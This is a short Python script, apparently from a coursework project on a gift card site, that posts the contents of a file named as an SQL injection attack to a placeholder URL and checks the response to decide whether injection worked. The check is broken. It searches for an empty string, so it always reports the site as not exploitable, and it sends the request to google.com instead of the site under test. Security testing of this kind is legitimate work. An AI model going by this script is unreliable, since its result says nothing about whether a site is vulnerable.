import requests

file = open('GiftcardSite/SQLInjectionAttack.gftcrd')
inflitration = 'https://google.com'
init_session = requests.Session()
body = init_session.post(inflitration, data=file)
card_key = ""
if body.text.find(card_key):
	print("SQL Injection worked!")
else:
	print("Not exploitable to SQL Injection")
